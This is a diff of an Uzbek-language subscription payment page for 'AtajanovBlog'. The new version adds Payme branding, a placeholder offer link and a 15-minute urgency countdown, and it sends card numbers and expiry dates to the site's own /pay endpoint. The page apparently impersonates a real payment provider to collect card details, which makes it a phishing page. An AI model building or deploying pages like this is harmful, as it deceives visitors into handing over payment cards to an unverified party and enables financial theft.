@@ -1,114 +1,105 @@
 <!DOCTYPE html>
 <html lang="uz">
 <head>
-  <meta charset="UTF-8">
-  <title>Obuna</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f2f2f2;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-    }
-
-    .container {
-      background: #fff;
-      padding: 30px 40px;
-      border-radius: 12px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      width: 100%;
-      max-width: 400px;
-    }
-
-    h2 {
-      text-align: center;
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px 14px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      box-sizing: border-box;
-      font-size: 16px;
-      transition: 0.3s ease;
-    }
-
-    input:focus {
-      border-color: #3f51b5;
-      outline: none;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #3f51b5;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      margin-top: 15px;
-    }
-
-    button:hover {
-      background-color: #303f9f;
-    }
-
-    #message {
-      margin-top: 15px;
-      text-align: center;
-      font-weight: bold;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Obuna</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+        body {
+            margin: 0;
+            background: #f9f9f9;
+            padding: 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .tarif {
+            background: #e6f1ff;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .timer {
+            float: right;
+            background: #fff;
+            color: red;
+            padding: 5px 10px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            background: #06d6a0;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: gray;
+        }
+        .footer img {
+            height: 20px;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>💳 Obuna uchun toʻlov</h2>
-    <form id="subscribeForm">
-      <input type="text" name="user_id" placeholder="User ID (raqamingiz)" required>
-      <input type="text" name="card_number" placeholder="Karta raqami (XXXX XXXX XXXX XXXX)" required>
-      <input type="text" name="card_expiry" placeholder="Amal muddati (MM/YY)" required>
-      <button type="submit">Obuna bo'lish</button>
-    </form>
+    <div class="container">
+        <p><strong>AtajanovBlog</strong><br>348342573<br>@a_atajanov</p>
+        <div class="tarif">
+            <h3>AtajanovBlog</h3>
+            <p>Tarif: Oylik obuna</p>
+            <h2>27000 so'm / 1 oyiga</h2>
+            <p>To'lov qilish havolasi<br>
+                muddati tugashiga qoldi:
+                <span class="timer" id="countdown">15:00</span>
+            </p>
+        </div>
+        <form action="/pay" method="POST">
+            <h4>Karta ma’lumotlaringizni kiriting</h4>
+            <input type="text" name="card_number" placeholder="0000 0000 0000 0000" required>
+            <input type="text" name="expire_date" placeholder="MM / YY" required>
+            <button type="submit">🔒 Davom etish</button>
+        </form>
+        <div class="footer">
+            Davom etish orqali siz <a href="#">Payme Ofertasini</a> tasdiqlaysiz<br>
+            <p>Powered by <img src="https://payme.uz/logo.png" alt="Payme"></p>
+        </div>
+    </div>
 
-    <div id="message"></div>
-  </div>
+    <script>
+        let time = 900; // 15 minutes
+        const countdown = document.getElementById("countdown");
 
-  <script>
-    document.getElementById('subscribeForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      const user_id = this.user_id.value;
-      const card_number = this.card_number.value;
-      const card_expiry = this.card_expiry.value;
-
-      const response = await fetch('/subscribe', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          user_id,
-          card_number,
-          card_expiry
-        })
-      });
-
-      const result = await response.json();
-      const message = document.getElementById('message');
-      message.textContent = result.message;
-      message.style.color = result.success ? 'green' : 'red';
-    });
-  </script>
+        setInterval(() => {
+            if (time <= 0) return;
+            time--;
+            const min = String(Math.floor(time / 60)).padStart(2, '0');
+            const sec = String(time % 60).padStart(2, '0');
+            countdown.textContent = `${min}:${sec}`;
+        }, 1000);
+    </script>
 </body>
 </html>
